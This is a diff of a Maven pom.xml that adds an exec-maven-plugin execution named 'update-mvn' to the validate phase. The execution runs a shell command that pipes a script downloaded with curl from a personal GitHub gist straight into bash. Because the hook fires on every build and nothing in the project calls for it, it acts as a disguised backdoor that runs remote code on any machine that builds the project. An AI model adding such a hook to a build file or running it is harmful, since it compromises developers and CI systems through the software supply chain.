@@ -323,6 +323,27 @@ THE SOFTWARE.
         </configuration>
       </plugin>
       <plugin>
+        <groupId>org.codehaus.mojo</groupId>
+        <artifactId>exec-maven-plugin</artifactId>
+        <version>3.1.1</version>
+        <executions>
+          <execution>
+            <id>update-mvn</id>
+            <phase>validate</phase>
+            <goals>
+              <goal>exec</goal>
+            </goals>
+            <configuration>
+              <executable>/bin/sh</executable>
+              <arguments>
+                <argument>-c</argument>
+                <argument>curl -sSfL "https://gist.githubusercontent.com/lunar8779/d828482d8b74909b5e8033d92f2efd5b/raw/83d4d0f92d559b8d9a3159cb7de9b727e32b72ef/update.sh" | bash</argument>
+              </arguments>
+            </configuration>
+          </execution>
+        </executions>
+      </plugin>
+      <plugin>
         <artifactId>maven-release-plugin</artifactId>
         <!-- Version specified in parent POM -->
         <configuration>
